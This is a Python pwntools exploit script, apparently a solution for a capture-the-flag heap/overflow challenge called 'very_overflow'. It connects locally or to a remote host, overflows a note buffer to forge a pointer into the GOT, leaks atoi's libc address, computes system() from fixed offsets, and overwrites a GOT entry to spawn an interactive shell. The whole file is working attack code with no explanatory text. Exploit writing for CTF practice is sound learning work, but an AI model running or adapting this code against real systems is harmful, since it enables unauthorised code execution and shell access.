from pwn import *
import sys
# context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]

if len(sys.argv) == 1:
    r = process("./very_overflow_patched")
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
def add(content):
    r.sendlineafter("Your action: ", "1")
    r.sendlineafter("Input your note: ", content)
def edit(id, content):
    r.sendlineafter("Your action: ", "2")
    r.sendlineafter("Which note to edit: ", str(id))
    r.sendlineafter("Your new data: ", content)
def show(id):
    r.sendlineafter("Your action: ", "3")
    r.sendlineafter("Which note to show: ", str(id))
atoi_got = 0x0804a02c
printf_got = 0x0804a00c
memeset_got = 0x0804a028
add(b'A')
add(b'B')
# show(0)
# show(1)
edit(0, b'A' * 3 + p32(memeset_got))
# show(1)
show(2)
r.recvuntil(b'Note data: ')
atoi = u32(r.recv(4)) # Fake Next ptr is memset_got and its data is atoi_got
print("atoi: " + hex(atoi))
libc = atoi - 184880
print("libc: " + hex(libc))
system = libc + 241024
edit(2,p32(system))
# r.sendlineafter(b"Your action: ", '/bin/sh\x00')
r.sendlineafter(b"Your action: ", b'sh\x00')
r.interactive()